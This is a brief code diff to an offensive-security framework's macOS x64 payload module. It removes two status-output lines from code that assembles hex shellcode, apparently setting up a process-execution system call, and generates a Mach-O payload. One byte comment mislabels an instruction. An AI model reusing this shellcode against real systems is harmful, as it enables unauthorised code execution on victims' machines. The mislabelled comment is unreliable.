@@ -46,7 +46,6 @@ class HatSploitPayload(Payload, HatVenom):
             'call': b'\xe8' + struct.pack("<I", len((message + '\x00').encode()) + 0xd)
         }
 
-        self.output_process("Generating shellcode...")
         shellcode = (
             b"\x48\x31\xC0"          # xor rax,rax
             b"\xB8\x3B\x00\x00\x02"  # mov eax,0x200003b
@@ -63,7 +62,5 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x0F\x05"              # loadall286
         )
 
-        self.output_process("Generating payload...")
         payload = self.generate('macho', 'x64', shellcode, offsets)
-
         return payload
